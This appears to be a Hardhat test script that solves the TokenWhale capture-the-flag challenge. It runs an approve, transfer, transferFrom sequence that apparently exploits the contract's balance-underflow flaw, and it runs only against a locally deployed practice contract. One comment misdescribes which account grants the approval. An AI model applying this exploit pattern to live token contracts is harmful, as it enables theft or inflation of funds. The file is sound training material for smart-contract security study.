const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("TokenWhaleChallenge", () => {
  it("Solves the challenge", async () => {
    const [primaryAccount, secondaryAccount] = await ethers.getSigners();

    const primaryAccountAddress = await primaryAccount.getAddress();
    const challengeFactory = await ethers.getContractFactory(
      "TokenWhaleChallenge"
    );
    const challengeInstance = await challengeFactory.deploy(
      primaryAccountAddress
    );
    await challengeInstance.deployed();

    // Allow the secondary account to spend tokens on behalf of the primary account
    const approvalTx = await challengeInstance
      .connect(secondaryAccount)
      .approve(primaryAccount.address, 1000);
    await approvalTx.wait();

    // Transfer tokens from the primary account to the secondary account
    const transferTx = await challengeInstance
      .connect(primaryAccount)
      .transfer(secondaryAccount.address, 501);
    await transferTx.wait();

    // Use the primary account to transfer tokens from the secondary account to the zero address
    const transferFromTx = await challengeInstance
      .connect(primaryAccount)
      .transferFrom(
        secondaryAccount.address,
        "0x0000000000000000000000000000000000000000",
        500
      );
    await transferFromTx.wait();

    // Check if the challenge has been solved
    expect(await challengeInstance.isComplete()).to.be.true;
  });
});
